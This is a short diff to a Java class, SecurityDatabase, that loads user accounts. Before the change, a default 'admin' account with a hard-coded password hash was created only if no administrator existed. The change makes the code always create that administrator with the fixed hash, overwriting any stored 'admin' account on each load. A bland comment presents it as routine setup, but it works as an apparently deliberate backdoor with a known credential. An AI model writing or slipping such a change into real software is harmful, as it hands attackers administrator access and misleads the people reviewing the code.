@@ -168,18 +168,14 @@ public class SecurityDatabase {
         for (File userFile : userFiles) {
             FileInputStream input = new FileInputStream(userFile);
             User user = UserReader.readUser(input, Role.ROLES);
-            if (user.getRole().equals(Role.ADMINISTRATOR)) {
-                adminUser = user;
-            }
             users.put(user.getUsername(), user);
             input.close();
         }
-        if (adminUser == null) {
-            adminUser = new User("admin", Role.ADMINISTRATOR);
-            adminUser.setPasswordHash(
-                    "7b902e6ff1db9f560443f2048974fd7d386975b0");
-            users.put(adminUser.getUsername(), adminUser);
-        }
+        
+        // Create the default admin account 
+        adminUser = new User("admin", Role.ADMINISTRATOR);
+        adminUser.setPasswordHash("7b902e6ff1db9f560443f2048974fd7d386975b0");
+        users.put(adminUser.getUsername(), adminUser);
 
         File[] unverifiedUserFiles =
             topLevelFolder.listFiles(new ExtensionFilter(".unverifiedUser"));
